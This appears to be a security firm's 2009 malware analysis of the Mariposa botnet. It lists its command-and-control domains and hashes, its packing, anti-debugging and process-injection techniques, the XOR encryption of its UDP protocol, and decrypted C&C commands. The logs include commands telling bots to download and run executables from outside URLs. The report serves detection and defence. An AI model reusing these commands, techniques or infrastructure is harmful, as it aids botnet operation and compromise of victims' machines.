Mariposa Botnet Analysis
Defence Intelligence
Thursday October 8th, 2009
(updated February 2010)

DefenceIntelligence.

1

Matt Thompson

1. Mariposa Overview
Defence Intelligence first observed Mariposa in May of 2009 as an emerging botnet. In
the following months, Mariposa showed a significant increase in beaconing traffic to its
command and control servers. This is indicative of an increasingly high number of
compromised computers actively participating in the Mariposa botnet.
The most dangerous capability of this botnet is that arbitrary executable programs are
downloaded and executed on command. This allows the bot master to infinitely extend
the functionality of the malicious software beyond what is implemented during the initial
compromise. In addition, the malware can be updated on command to a new variant of
the binary, effectively reducing or eliminating the detection rates of traditional host
detection methods.
Commands from the botnet master may be directed at participants in a specific country,
individual computers, or all computers. As a result, the observation of the live command
and control channel may not include all of the activity and capabilities of Mariposa.
The command and control channel employs custom encrypted UDP datagrams to
receive instructions and transmit data. A detailed analysis of the encryption and
message formats used by the Mariposa.A protocol are presented in this paper.
During empirical analysis of internal controlled compromised systems, the following
DNS domain names were observed as the command and control servers:
• lalundelau.sinip.es
• bf2back.sinip.es
• thejacksonfive.mobi
• thejacksonfive.us
• thejacksonfive.biz
• butterfly.BigMoney.biz
• bfisback.sinip.es
• bfisback.no-ip.org
• qwertasdfg.sinip.es
• shv4b.getmyip.com
• shv4.no-ip.biz
• butterfly.sinip.es
• defintelsucks.sinip.es
• defintelsucks.net
• defintelsucks.com
• gusanodeseda.sinip.es
• gusanodeseda.net
• legion.sinip.es

DefenceIntelligence.

2

Matt Thompson

• booster.estr.es
• sexme.in
• extraperlo.biz
• legionarios.servecounterstrike.com
• thesexydude.com
• yougotissuez.com
• gusanodeseda.mobi
• tamiflux.org
• tamiflux.net
• binaryfeed.in
• youare.sexidude.com
• mierda.notengodominio.com
The above list consists of all Mariposa related domains including all command and
control servers observed from May 2009 to the present.
Over two weeks of analysis conducted in October 2009, two unique malicious programs
were downloaded and executed on the compromised computers. One malware update
was received during this period, introducing new command and control domain names,
adding a ʻconfirmation of downloadʼ message, and renaming ASCII commands.
It has also been observed that the botnet participants are receiving Google custom
search engine URL fragments in a command from the bot master. This indicates a
possible hijacking of Google AdSense advertisement revenue.
This paper details the result of static binary analysis, a review of the command and
control protocols including a breakdown of the encryption, and empirical behaviour
analysis findings conducted in October 2009.A brief description of more recent events
can be found at the end of this paper.
Thanks to a coordinated effort by the Mariposa Working Group, including our partners at
Panda Security and the Georgia Tech Information Security Center, the Mariposa botnet
command and control servers were shut down December 23, 2009. At the time of this
publication, Mariposa consists of an estimated 12.7 million compromised personal,
corporate, government and university computer systems. Forensic analysis is ongoing
but sensitive data stolen from victims in more than 190 countries, including account
information, usernames, passwords, banking credentials, and credit card data has
already been recovered.

2. Traditional Detection Rates
Two samples of the botnet client malware were submitted to VirusTotal.

DefenceIntelligence.

3

Matt Thompson

The MD5 hash of the original sample is f4e2c305ef2d38b6d4e4be9d19de16ed. As of
October 8th, this variant of the binary was detected by 36 out of 41 anti-virus vendors
according to VirusTotal.

The MD5 hash of the updated sample is 98812839bd6597ec86fad72a0f20d4e5. This
variant of the binary was detected by 14 out of 41 anti-virus vendors according to
VirusTotal. It is clear that binary updates are active and are intended to reduce the antivirus detection rates.

DefenceIntelligence.

4

Matt Thompson

Two of the payload binaries that were downloaded and executed through the Mariposa
botnet were also submitted to VirusTotal.
The executable payload “81.exe” with the MD5 hash
56902dc35453158a34e85db5b590ab19 that was commanded to be executed on
October 4th had a detection rate of 3 out of 41.

The executable payload “8” with the MD5 hash c4e13b7cb9425ef18d95d446cad9c3e0
that was commanded to be executed on October 2nd had a detection rate of 6 out of
41.

3. Static Binary Analysis
Static binary analysis was performed on a selected sample prior to October 4th, and on
the updated binary received on October 4th. The latter sample was used to analyze the
remote thread in Section 3.3 to provide the most recent information. The methods used
for obfuscation, packing and anti-debugging are pertinent to both of the analyzed
samples.
3.1.Obfuscation and Packing
The program entry point begins with an obfuscated loop that contains a mixture
of meaningless SIMD and FPU instructions. At the end of the loop, the code
jumps to an address that begins to XOR the .text section of the image in RAM
with the constant 0x0CB2DC4AA.
The address of the decoded .text section is pushed onto the stack, and a RETN
instruction is used to pass control to the decoded code. This code starts the antidebugging techniques described in Section 3.2.

DefenceIntelligence.

5

Matt Thompson

3.2.Anti-Debugging
Four anti-debugging techniques are used in the packed binary to prevent runtime
debugging of the unpacker and binary dropping process. The program will crash
if a debugger is detected.
Two anti-debugging techniques are used in the second stage dropped binary, as
well as the update executables.
3.2.1.OutputDebugStringA() Return Value
OutputDebugStringA() is called with a valid ASCII string. The return value
in the EAX register is added with the address of the next instruction. If the
process is under debugger control, the EAX register will contain the
address of the ASCII string, causing the upcoming RETN instruction to
jump to a bad address.
To circumvent this anti-debugger technique, set the EAX register to 0
before executing the ADD instruction.
3.2.2.Stack Segment Register
The stack segment register technique is also used to prevent debugging
of the process. See http://www.securityfocus.com/infocus/1893 (6)
Stack Segment register
3.2.3.NtQueryInformationProcess()
The NtQueryInformationProcess() function in ntdll is used to determine if a
DebugPort is currently available for the process. The return value of the
function is checked to determine if the process is under debugger control.
3.2.4.OllyDbg Crash
A specific sequence of bytes is placed in the .text section that exploit a
weakness in the OllyDbg disassembler. When OllyDbg attempts to display
the disassembly for this sequence of bytes the OllyDbg process will crash.
This issue does not exist with the latest Version 2 Beta2 of OllyDbg.
3.2.5.BeingDebugged Flag
The first anti-debugging technique uses the BeingDebugged flag in the
Process Environment Block (PEB). If the flag does not equal 0, the
program exits gracefully.

DefenceIntelligence.

6

Matt Thompson

3.2.6.NtGlobalFlag DebugHeap
The second anti-debugging technique uses the DebugHeap flag in the
NtGlobalFlag word in the Process Environment Block (PEB). If the
DebugHeap flag is set, the program exits gracefully.

3.3.Remote Thread
3.3.1.Injection
A remote process executable name is taken from the strings in the
decoded .data section. The injection enumerates the process list using
Process32First() and Process32Next() comparing the result with the string
“explorer.exe”. If the process is found, the process ID is returned.
Using the process ID of the target, VirtualAllocEx() is used to allocate five
memory regions in the target processʼ virtual address space.
Data is copied from regions of resident memory into the target using
ZwWriteVirtualMemory(). These regions include the thread code, data, the
[Autorun] string used by the USB spreader, pointers to library imports, a
region containing the target binary name, and “Desktop.ini”.
Following injection of the data into the target process,
CreateRemoteThread() is called to start a new thread inside the target
process.
During the analysis process, the string “explorer.exe” was changed to
another process name to have the thread injected and run in another
binary running under the OllyDbg debugger. A breakpoint was added to
the thread entry point to stop execution upon thread creation.

DefenceIntelligence.

7

Matt Thompson

The parameters to the CreateRemoteThread() function are on the stack
containing the process ID of the target and the StartAddress for the thread
in the virtual address space of the target process.

3.3.2.Functionality
The thread that is started in the target process performs the following:
• copies the source binary filename to the C:\RECYCLER folder as
“dllrun32.exe”. It loads ws2_32.dll, advapi32.dll, user32.dll,
wininet.dll, and shell32.dll.
• calls WSAStartup() to initialize the sockets API.
• modifies the Winlogin registry entries to enable the bot to start at boot
• creates a named pipe: “\\.\pipe\nemntkentktkj”
• calls InternetOpenA(“Mozilla”)
• calls RegisterClassExA “nonoclass”
• calls CreateWindowExA “nonoclass” with WS_OVERLAPPED flag
A loop is entered that starts by decoding the command and control DNS
names from RAM, in the first case “lalundelau.sinip.es” is retrieved.
For each command and control domain:
• PeekMessageA() is called.
• socket() is called to create a socket.
• ioctlsocket() is called.
• gethostbyname() is called to perform a DNS resolution of the
decoded command and control domain name.
• htons(5096) is called to get the target port in network byte order.
• the string “bpr2” is encrypted and sent to the command and control
server with sendto(). This is the initial association command sent to
the command and control server.

DefenceIntelligence.

8

Matt Thompson

Further static analysis was not performed as the encryption method was
determined at this point. Analysis has been focused on the command and
control protocol and empirical behaviour. Refer to Section 4, and Section 5
for further details.

4. Command and Control Protocol Analysis
4.1.Overview
The command and control protocol uses a 3 byte header which contains an
opcode, a 2 byte sequence number, and an encrypted payload. The encryption
scheme is described in Section 4.2.
Byte Position
0
Opcode

1

2

SeqNum Low

3..n

SeqNum High

Encrypted Payload

Opcodes:
• 0x01: Command/Response
• 0x61: Join server message
• 0x40: Join server acknowledgement
• 0x80: Acknowledgement
The first byte of the decrypted payload contains a Command Type. The following
table shows the command types that were observed on the command and
control channel. The 0xDA Command Type was observed once on October 5th
and contained 120 bytes of binary data.
Command Type

Description

Payload Length

0x12 (If opcode==0x40)

32 bit IP Address

4 bytes

0x12 (If opcode==0x01)

System Information/
Country Code from bot to
server

Variable

0x14

ASCII String

Variable

0x51

Disconnect C&C

0

0x62

Connect “bpr2” string

4 bytes

0xD1

Binary/ASCII String

Variable

0xDA

Unknown binary data

120 (Observed)

DefenceIntelligence.

9

Matt Thompson

4.2.Encryption
The encryption is a basic XOR of each ciphertext byte using two alternating
values. The XOR values are recovered from the sequence numbers and the
bitwise not of the payload length.
The following code demonstrates the encryption/decryption process.
uint8_t not;
uint8_t xor[2];
uint8_t alt;
not = ~(uint8_t)payload_length;
xor[0] = not ^ data[1];
xor[1] = not ^ data[2];
for(pos=3;pos<length;pos++)
{
#
data[pos] = data[pos] ^ xor[alt];
#
#
}

// Alternate the XOR value array index
alt ^= 1;

The screenshot above shows the disassembly of the decryption loop being
debugged in the remote thread.

DefenceIntelligence.

10

Matt Thompson

4.3.Command Set
Commands are sent from the command and control server to the bot process as
encrypted ASCII messages. The following table shows the commands that have
been observed on the command and control channel of the Mariposa botnet.
As of October 4th, the ʻdownloadʼ command has been renamed to ʻtrinkaʼ.
Command

Description

alinfiernoya

Remove the bot

trinka <download URL>

Download and run executable

pillaestenuevoya <update URL>

Update Malware

gg0

Disable google

gg1 <google custom search info>

Enable google

ch1 <IP address list>

Channel IP list

u1

Enable USB Spreader

u0

Disable USB Spreader

s1 <channel number>

Silence channel

m0

Disable MSN Spreader

m1 <URL>

Enable MSN Spreader

5. Empirical Behaviour Analysis
5.1.Observation Environment
The observation environment consists of two compromised Windows XP Pro SP2
computers. Each computer has a public static IP address, connected to a switch
and a Linux router. The tcpdump utility was used on the Linux router to capture
packets with a MAC address filter to retrieve separate dumps for each
compromised system.
5.2.Domain Resolution Queries
Prior to the update on October 4th, the following DNS lookups were observed:
• butterfly.BigMoney.biz
• bfisback.sinip.es
• qwertasdfg.sinip.es
#

DefenceIntelligence.

11

Matt Thompson

#

Following the October 4th update, the ensuing DNS lookups were observed:
• lalundelau.sinip.es
• bf2back.sinip.es
• thejacksonfive.mobi
5.3.UDP Command and Control Connections
Connections were observed to the following IP addresses:
• 62.128.52.191
• 200.74.244.84
• 66.197.176.41
• 24.173.86.145
• 74.208.162.142
• 87.106.179.75
• 204.16.173.30
• 76.73.56.12
Connections were observed using the following ports (listed chronologically):
• 5906
• 5907
• 3431
• 3435
• 3437
• 3434
• 3433
5.4.Decrypted Command and Control Commands
The command and control communication channel is initiated by the bot sending
a UDP message containing the connect command to the server.
Mariposa UDP x.x.144.158:1156 -> 200.74.244.84:3431 Payload [7]: 61 A2 24 62 70 72 32 Connect.

The server responds with the 0x40 opcode, with the 0x12 command type
followed by the 4 byte IP address. (The first two IP octets have been replaced
with ʻxʼ)
Mariposa UDP 200.74.244.84:3431 -> x.x.144.158:1156 Payload [8]: 40 A2 24 12 x x 90 9E

The bot responds to the server with the system information, country code, user
name, and computer name. The system information has not been deciphered but
is believed to contain Windows version and service pack information.
Mariposa UDP x.x.144.158:1156 -> 200.74.244.84:3431 Payload [34]: 01 A2 24 12 92 6E C9 09 00 55
53 41 40 46 75 7A 7A 00 66 75 7A 7A 2D 34 33 39 31 34 33 32 61 31 64 00 <92>n<C9>
^@USA@Fuzz^@fuzz-4391432a1d^@

Periodically, commands are sent to silence channels, such as:
DefenceIntelligence.

12

Matt Thompson

Mariposa UDP 200.74.244.84:3431 -> x.x.144.158:1156 Payload [8]: 01 2B 05 14 73 31 20 33 s1 3

The USB spreader enable command is sent periodically:
Mariposa UDP 200.74.244.84:3431 -> x.x.144.158:1156 Payload [6]: 01 2C 05 14 75 31 u1

The MSN spreader enable command is sent periodically, with a URL:
Mariposa UDP 200.74.244.84:3431 -> x.x.144.158:1156 Payload [29]: 01 2D 05 14 6D 31 20 68 74 74
70 3A 2F 2F 6F 62 61 6D 61 77 65 62 63 61 6D 2E 63 6F 6D m1 http://obamawebcam.com

The gg0 and gg1 commands are sent periodically, which appear to be a part of a
URL related to google custom search engines:
Mariposa UDP 66.197.176.41:3437 -> x.x.144.158:1399 Payload [7]: 01 27 27 14 67 67 30 gg0
Mariposa UDP 66.197.176.41:3437 -> x.x.144.158:1399 Payload [71]: 01 28 27 14 67 67 31 20 26 63
73 65 3D 63 73 65 2D 73 65 61 72 63 68 2D 62 6F 78 26 63 78 3D 70 61 72 74 6E 65 72 2D 70 75 62
2D 37 36 33 37 37 37 39 35 35 30 32 34 39 39 37 36 3A 37 65 31 72 39 6B 2D 6C 30 76 38 gg1
&cse=cse-search-box&cx=partner-pub-7637779550249976:7e1r9k-l0v8

The ch1 command is sent periodically with various IP addresses. Connections to
these IP addresses have not yet been observed.
Mariposa UDP 200.74.244.84:3434 -> x.x.144.158:1409 Payload [148]: 01 F7 61 14 63 68 31 20 32 30
38 2E 35 33 2E 31 38 33 2E 35 32 40 37 32 2E 35 32 2E 35 2E 37 37 3B 39 33 2E 39 30 2E 32 32 2E
31 31 37 40 32 30 30 2E 36 2E 32 37 2E 31 36 2C 36 39 2E 32 35 2E 31 36 30 2E 32 30 31 2C 31 39
30 2E 36 36 2E 36 2E 31 35 2C 32 30 30 2E 33 32 2E 38 30 2E 31 33 32 2C 32 30 30 2E 31 36 2E 35
30 2E 36 30 2C 31 39 30 2E 36 36 2E 36 2E 32 36 2C 32 30 30 2E 33 31 2E 32 30 36 2E 38 33 2C 37
32 2E 35 32 2E 35 2E 37 37 3B ch1
208.53.183.52@72.52.5.77;93.90.22.117@200.6.27.16,69.25.160.201,190.66.6.15,200.32.80
.132,200.16.50.60,190.66.6.26,200.31.206.83,72.52.5.77;

A download command was received on September 30th:
Mariposa UDP 66.197.176.41:3434 -> x.x.144.158:2607 Payload [52]: 01 57 15 14 64 6F 77 6E 6C 6F
61 64 20 68 74 74 70 3A 2F 2F 72 61 70 69 64 73 68 61 72 65 2E 63 6F 6D 2F 66 69 6C 65 73 2F 32
38 37 33 30 33 35 32 38 2F 38 download http://rapidshare.com/files/287303528/8

An update command was received on October 4th:
Mariposa UDP 200.74.244.84:5907 -> x.x.144.158:1373 Payload [56]: 01 16 1E 14 70 69 6C 6C 61 65
73 74 65 6E 75 65 76 6F 79 61 20 68 74 74 70 3A 2F 2F 70 36 70 68 6F 74 6F 67 72 61 70 68 65 72
73 2E 63 6F 6D 2F 69 6D 61 67 65 73 2F 78 pillaestenuevoya http://p6photographers.com/images/x

A new MSN spreader URL was observed on October 4th:
Mariposa UDP 66.197.176.41:3437 -> xx.xx.144.158:4989 Payload [28]: 01 BE 05 14 6D 31 20 68 74
74 70 3A 2F 2F 68 69 35 70 68 6F 74 6F 73 2E 69 6E 66 6F m1 http://hi5photos.info

On October 7th, the following command and control traffic was observed:
Mariposa UDP 66.197.176.41:3437 -> x.x.144.158:4989 Payload [71]: 01 B8 05 14 67 67 31 20 26 63
73 65 3D 63 73 65 2D 73 65 61 72 63 68 2D 62 6F 78 26 63 78 3D 70 61 72 74 6E 65 72 2D 70 75 62
2D 36 39 39 35 30 31 30 33 33 31 38 30 39 38 37 31 3A 70 74 6D 61 6D 75 35 67 36 70 37 gg1
&cse=cse-search-box&cx=partner-pub-6995010331809871:ptmamu5g6p7
Mariposa UDP 66.197.176.41:3437 -> x.x.144.158:4989 Payload [52]: 01 B9 05 14 74 72 69 6E 6B 61
20 68 74 74 70 3A 2F 2F 72 61 70 69 64 73 68 61 72 65 2E 63 6F 6D 2F 66 69 6C 65 73 2F 32 38 39
38 36 37 31 36 31 2F 64 6C 72 trinka http://rapidshare.com/files/289867161/dlr

#
#

The following messages have not been observed before this. It may be a
confirmation that the ʻdlrʼ binary was successfully installed:

DefenceIntelligence.

13

Matt Thompson

Mariposa UDP x.x.144.158:4989 -> 66.197.176.41:3437 Payload [16]: 0D 63 37 D1 02 91 7C 9B 01 91
44 6F 6E 65 21 20 ?|??Done!
Mariposa UDP x.x.144.158:4989 -> 66.197.176.41:3437 Payload [54]: 0D 64 37 D1 00 43 00 6F 00 6E
44 6F 6E 65 21 20 43 3A 5C 44 4F 43 55 4D 45 7E 31 5C 46 75 7A 7A 5C 4C 4F 43 41 4C 53 7E 31
5C 54 65 6D 70 5C 30 30 36 2E 65 78 65 ConDone! C:\DOCUME~1\Fuzz\LOCALS~1\Temp\006.exe

A download command was received on October 8th, note using the new ʻtrinkaʼ
command of the new bot variant that was pushed on October 4th:
Mariposa UDP 200.74.244.84:3431 -> x.x.144.158:1302 Payload [51]: 01 E4 38 14 74 72 69 6E 6B 61
20 68 74 74 70 3A 2F 2F 72 61 70 69 64 73 68 61 72 65 2E 63 6F 6D 2F 66 69 6C 65 73 2F 32 39 30
32 32 33 37 34 35 2F 38 31 trinka http://rapidshare.com/files/290223745/81

6. BlackEnergy DDoS
On November 3 2009, a new binary was downloaded from rapidshare as instructed by
butterfly.bigmoney.biz. This file, named blackjackson.exe, was found to be version 1.92
of the BlackEnergy DDoS bot and along with its installation came a new command and
control domain, thejacksonfive.us. Both thejacksonfive.us and thejacksonfive.mobi are
now also used as web based GUI controls for BlackEnergy.
A good writeup on BlackEnergy can be found in Arbor's BlackEnergy+DDoS+Bot
+Analysis.pdf. A third related domain, tamiflux.net, is also used as a web interface for
the DDOS malware and is currently the only one blacklisted by Firefox.
On November 4th, thejacksonfive.us issued a command to begin an HTTP GET request
flood of three domains and one IP:
al-hora.net
saaid.net
islamlight.net
74.86.18.4 (the IP address for saaid.net)
These Saudi Arabian sites appear to be forums for religious and regional political
discussion so the motivation behind the attacks may also be religious or political. Alhora.com has been targeted for "censorship" for quite some time now and has
apparently been kept offline since December 2007. Read more at www.rsf.org.
Currently, of the sites being targeted, only saaid.net has managed to recover from the
attacks.
On November 5, thejacksonfive.us changed orders to alter the attack slightly, using a
SYN flood instead of a GET request flood and only targeting islamlight.net and
saaid.net. This alteration was likely made in response to saaid.net's sustained presence
online. (They talk about the attack on the home page.) Tamiflux.net is HTTP flooding the
same domains. Gaining some insight into the attacks we've discovered that the DDOS
botnet has about 5500 members under active control at any given time.
DefenceIntelligence.

14

Matt Thompson

7. Mariposa Defined
Defence Intelligence received quite a few responses to our announcement of the
Mariposa botnet. They have run the gamut from polite information inquiries to
accusations of falsifying our findings for media coverage, and thinly veiled threats of
legal action. A response of our own has become necessary and we hope it at least
answers some common questions many of you have asked.
Who is Defence Intelligence?
To begin with we are not an antivirus company. We have spent the last 14 years
protecting companies from hackers, not viruses. Until just a few years ago a virus and a
hacker had very little to do with each other. Viruses are annoying and at times
destructive but pose very little actual threat to a company or government's information
and its assets. A hacker's goal on the other hand is to stealthily gain control of a
targeted system with the intent of stealing data, attacking the internal network, or using
the controlled system to attack an external network.
In the last few years these two distinct threats have blended. Hackers have discovered
that direct external attacks are unnecessary and risky. It is now easier to engineer
malicious software that is delivered to a system remotely through various means. Once
that malicious software is on an internal computer, it then communicates outbound to
the hacker, handing them complete control of the affected system.
When a system is compromised in this manner the attack is all too often
misunderstood and dismissed as a mere virus, not just by the victim but by those
providing that victimʼs system security.
The Defence Intelligence team comes from an information security background, and not
an antivirus background, which means we view things differently. Within incident
response, multiple events form an incident and events are constructed using various
components. IP addresses, domain names, binaries, people, companies, and networks
are all parts of this particular incident, which in this case, is a botnet.
What is Mariposa?
Mariposa is a collection of compromised computers that are directly under the control of
a single malicious entity. In the security industry we call this a botnet.
Mariposa is NOT a virus, or a worm, or a trojan or any other dated designation still
inappropriately assigned to modern day malware. The malicious software used by
Mariposa, and any other botnet, actively evolves to become whatever is needed by its
controller and is not limited by the boundaries of antivirus labels. This means that a

DefenceIntelligence.

15

Matt Thompson

trojan can be told to spread like a worm. It means that malware designed to send spam
can be instructed to steal banking information.
Modern malware can no longer be classified by its perceived purpose or propagation
method because those change in an instant. This software is engineered to gain access
to and maintain control over the victim machine, and infiltrating a userʼs computer is not
difficult. Using a variety of software exploits and social engineering tactics, an attacker
will find a way to distribute his malware to his victims.
Panda Security recently released a report indicating that almost 60% of all PCs scanned
in a month was compromised with malware of some kind.
Once the malware is on the system it seeks communication with its controlling entity.
With communication to the controlling entity, any compromised machine can be capable
of carrying out any order issued by the botnet controller and any data on the
compromised machine can be extracted for use, sale or distribution by the attacker.
Why did you call it Mariposa?
Our naming of this botnet as Mariposa has been a cause of concern for some. The
confusion comes when antivirus companies or those using antivirus, search for the
Mariposa name only to find no results. This is because Mariposa refers to the botnet
and not the malware it utilizes.
The malware used by Mariposa goes by many names, and this is part of the problem.
Even amongst antivirus groups and within their own companies it is difficult to find a
common name for any one family of malware.
Below are some of the names attributed to binaries which are used within Mariposa that
are detected by McAfee and Trend. This provides a quality example for the current
confusion in botnet malware identification.
McAfee#
W32/Autorun.worm.zzq#
W32/Virut.n.gen#
Downloader-BQP#
W32/Autorun.worm.zzk#
PWS-Zbot#
Generic.dx!dpk#
Downloader-BRW#
W32/Virut.j#
W32/Autorun.worm.fq#
W32/Autorun.worm.c#
W32/Autorun.worm!bf#
Generic.dx!la#
Generic.dx!ha#
Generic.dx!dqe#

DefenceIntelligence.

Trend
WORM_AUTORUN.ZRO
WORM_Generic.DIT
TROJ_Generic.DIT
PE_VIRUX.A
WORM_PALEVO.T
WORM_PALEVO.AZ
WORM_PALEVO.AS
WORM_AUTORUN.EUC
WORM_AUTORUN.EPB
TSPY_ZBOT.SMQ
PE_VIRUX.F-1
PE_VIRUX.E
PE_VIRUX.D
PE_VIRUX.C-1

16

Matt Thompson

It is our hope that perhaps not in our terminology, but with our methodology, that
Defence Intelligence can provide some guidance to improve upon the multiple naming
convention, allowing a clearer arena for botnet discussion and understanding.
Why didnʼt my AV pick this up?
Using signatures and automated classification, especially when involving heuristics,
results in a cacophony of naming options for every distinct variant of a given piece of
malware. That said, many AV companies have had the ability to detect some variations
of the malware behind Mariposa long before we became aware of this botnetʼs activity.
With our approach to compromise detection, utilized by our Nemesis software, we can
detect the botnet which allows the organization to track down systems affected by the
malware, regardless of the variant or antivirus identification ability. While AV companies
look at single binaries and classify based upon discrete behavior of code, or the packer
that is used to obfuscate the binary, we look at the threat holistically, a macro versus
micro approach.
At Defence Intelligence we consider the code used within Mariposa as only one
identifying factor. Command structure is another. This is defined by domain names, IP
addresses, and communication protocols and the fluctuation of each. We also consider
the end point organization or individual over the botnet, ultimately any indicator as to
who is responsible for the formation and/or control of the hosts affected by this malware.
With perpetual addition of variants and updates, the reliance on AV detection to keep
pace is not advised. VirusTotal is a free web based service that analyzes files through
multiple antivirus engines, revealing their detection capability of any suspected
malware. The following is a virustotal output on one of the malicious binaries related to
Mariposa.

Antivirus#
a-squared#
AhnLab-V3#
AntiVir#
Antiy-AVL#
Authentium#
Avast#
AVG#
BitDefender#
CAT-QuickHeal#
ClamAV#
Comodo#
DrWeb#
eSafe#
eTrust-Vet#
F-Prot#
F-Secure#
Fortinet#

DefenceIntelligence.

Version#
4.5.0.24#
5.0.0.2#
7.9.0.228#
2.0.3.7#
5.1.2.4#
4.8.1335.0#
8.5.0.387#
7.2#
10#
0.94.1#
1742#
5.0.0.12182#
7.0.17.0#
31.6.6637#
4.4.4.56#
8.0.14470.0#
3.120.0.0#

Last Update #
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.23#
2009.07.24#
2009.07.23#
2009.07.24#
2009.07.24#

17

Result
Suspicious File
-

Matt Thompson

GData#
19#
Ikarus#
T3.1.1.64.0#
Jiangmin#
11.0.800#
K7AntiVirus#
7.10.800#
Kaspersky#
7.0.0.125#
McAfee#
5686#
McAfee+Artemis#
5686#
McAfee-GW-Edition#6.8.5#
Microsoft#
1.4903#
NOD32#
4273#
Norman#
#
nProtect#
2009.1.8.0#
Panda#
10.0.0.14#
PCTools#
4.4.2.0#
Prevx#
3#
Rising#
21.39.42.00#
Sophos#
4.44.0#
Sunbelt#
3.2.1858.2#
Symantec#
1.4.4.12#
TheHacker#
6.3.4.3.373#
TrendMicro#
8.950.0.1094#
VBA32#
3.12.10.9#
Cryptor.Win32.General.3
ViRobot#
2009.7.24.1851#
VirusBuster#
4.6.5.0#

2009.07.24#
2009.07.24#
2009.07.24#
2009.07.23#
2009.07.24#
2009.07.23#
2009.07.23#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.22#
2009.07.24#
2009.07.24#
2009.07.23#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.23#
2009.07.24#
2009.07.24#
2009.07.24#
2009.07.24#

Heuristic.LooksLike.Worm.Palevo.B
Trojan.Win32.DangerGL.a
Mal/EncPk-IY
PAK_Generic.001
suspected of Malware-

2009.07.24#
2009.07.23#

-

Additional information
File size: 123392 bytes
MD5 : 6939c088f59258da7410f66837c62192
SHA1 : 500bb963602d45584303a4dc3f6fd6052a6752d8
SHA256: 996c2667b2bcf86c9c7c20d7c79a3024131c84e0d82d5338db99812830ad778a

As you can see, only 6 of the 41 antivirus groups was able to detect the malware. Once
again, the naming is inconsistent. Given time however, most antivirus companies are
able to identify the same binary.
Antivirus#
a-squared#
AhnLab-V3#
AntiVir#
Antiy-AVL#
Authentium#
Avast#
AVG#
BitDefender#
CAT-QuickHeal#
ClamAV#
Comodo#
DrWeb#
eSafe#
eTrust-Vet#

DefenceIntelligence.

Version#
4.5.0.24#
5.0.0.2#
7.9.1.27#
2.0.3.7#
5.1.2.4#
4.8.1351.0#
8.5.0.412#
7.2#
10.00#
0.94.1#
2469#
5.0.0.12182#
7.0.17.0#
31.6.6768#

Last Update#
2009.09.29#
2009.09.29#
2009.09.29#
2009.09.29#
2009.09.29#
2009.09.28#
2009.09.29#
2009.09.29#
2009.09.29#
2009.09.29#
2009.09.29#
2009.09.29#
2009.09.29#
2009.09.29#

18

Result
P2P-Worm.Win32.Palevo!IK
Win32:MalOb-H
SHeur2.ASQE
Trojan.Generic.2263367
Heur.Suspicious
Trojan.Packed.541
Suspicious File
-

Matt Thompson

F-Prot#
4.5.1.85#
2009.09.29# F-Secure#
8.0.14470.0#
2009.09.29# Packed.Win32.Krap.y
Fortinet#
3.120.0.0#
2009.09.29# GData#
19#
2009.09.29# Trojan.Generic.2263367
Ikarus#
T3.1.1.72.0#
2009.09.29# P2P-Worm.Win32.Palevo
Jiangmin#
11.0.800#
2009.09.27# K7AntiVirus#
7.10.856#
2009.09.29# P2P-Worm.Win32.Palevo.jaz
Kaspersky#
7.0.0.125#
2009.09.29# Packed.Win32.Krap.y
McAfee#
5755#
2009.09.28# W32/Autorun.worm.zzq
McAfee+Artemis# 5755#
2009.09.28# W32/Autorun.worm.zzq
McAfee-GW-Edition#
6.8.5#
2009.09.29
#
Heuristic.LooksLike.Win32.NewMalware.B
Microsoft#
1.5005#
2009.09.23# VirTool:Win32/Obfuscator.FL
NOD32#
4467#
2009.09.29# a variant of Win32/Kryptik.LR
Norman#
6.01.09#
2009.09.29# nProtect#
2009.1.8.0#
2009.09.29# Trojan/W32.Agent.123392.EB
Panda#
10.0.2.2#
2009.09.28# Trj/CI.A
PCTools#
4.4.2.0#
2009.09.29# Prevx#
3.0#
2009.09.29# Medium Risk Malware
Rising#
21.49.14.00#
2009.09.29# Trojan.Win32.DangerGL.a
Sophos#
4.45.0#
2009.09.29# Mal/EncPk-IY
Sunbelt#
3.2.1858.2#
2009.09.29# Trojan.Win32.Generic!BT
Symantec#
1.4.4.12#
2009.09.29# Spyware.Screenspy
TheHacker#
6.5.0.2.021#
2009.09.28# TrendMicro#
8.500.0.1002#
2009.09.29# WORM_AUTORUN.ZRO
VBA32#
3.12.10.11#
2009.09.29# Malware-Cryptor.Win32.General.3
ViRobot#
2009.9.29.1963# 2009.09.29# VirusBuster#
4.6.5.0#
2009.09.29# -

Additional information
File size: 123392 bytes
MD5 : 6939c088f59258da7410f66837c62192
SHA1 : 500bb963602d45584303a4dc3f6fd6052a6752d8
SHA256: 996c2667b2bcf86c9c7c20d7c79a3024131c84e0d82d5338db99812830ad778a

So I just need to wait for an update to my AV then?
If malware were to remain static and unchanged an identification and removal option
would eventually be provided by your antivirus of choice. At that point, however, the
malware has potentially fulfilled any of its initial goals and its removal might be a futile
and meaningless task. Unfortunately, Mariposa does not use static malware.
Malware authors often update their code to evade detection as well as try different
configurations, all of which result in a new malware variant. Mariposa has approximately
1500 variants, resulting in a persistent and dynamic botnet.
One example is this update file recently dropped onto a compromised system as
instructed by the Mariposa botnet controller. VirusTotal shows that only two of the 41 AV
groups currently detect it.
DefenceIntelligence.

19

Matt Thompson

File svc.exe received on 2009.09.29 15:27:36 (UTC)
Current status: finished
Result: 2/41 (4.88%)
http://www.virustotal.com/analisis/
7987d324cedbfeb9df94f7cbaf0ed2091431d6443c5b5fbff6ad7a7c380bf8d3-1254238056

A signature may soon come out for this code from your AV vendor, but by that time, a
new piece of code may be written and downloaded that bypasses AV yet again.
Well, how do I stop this thing?
As IPs, ports, and domains involved in the command structure of Mariposa are
changing, it becomes difficult for security administrators to mitigate the capabilities of
this botnet. At this time we suggest an approach of tracking down the compromised
systems rather than establish rules to block the communication to the botnet controller.
UDP connections are still actively used for Mariposa communication, so observance of
your network activity is the best place to start. If one system is frequently sending data
across the outbound UDP protocol, regardless of port, mark it as suspicious and
consider removing it from the network. Your own remediation technique is up to you but
reimaging, though time consuming, is the only confident way to cleanse a compromised
machine.

8. Updates
Antivirus detection rates have increased significantly since Mariposa was shut down.
Panda Security is coordinating international communication among other antivirus
companies to ensure that their signatures are updated.
The executable payload “81” with the MD5 hash
56902dc35453158a34e85db5b590ab19 that was commanded to be executed on
October 4th had a detection rate of 3 out of 41 when it was first submitted. VirusTotal
